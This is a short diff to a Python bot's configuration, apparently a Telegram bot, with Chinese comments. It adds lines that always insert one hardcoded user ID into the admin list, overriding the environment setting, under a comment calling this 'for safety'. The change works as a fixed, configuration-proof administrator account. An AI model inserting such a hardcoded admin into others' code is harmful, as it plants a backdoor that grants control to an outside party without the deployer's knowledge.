@@ -29,6 +29,10 @@ logger = logging.getLogger(__name__)
 # 環境變數配置
 TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x]
+# 確保指定管理員 ID 存在 (Hardcoded for safety)
+if 582328026 not in ADMIN_IDS:
+    ADMIN_IDS.append(582328026)
+
 PORT = int(os.getenv("PORT", 8080))
 
 # 狀態定義 (註冊流程)
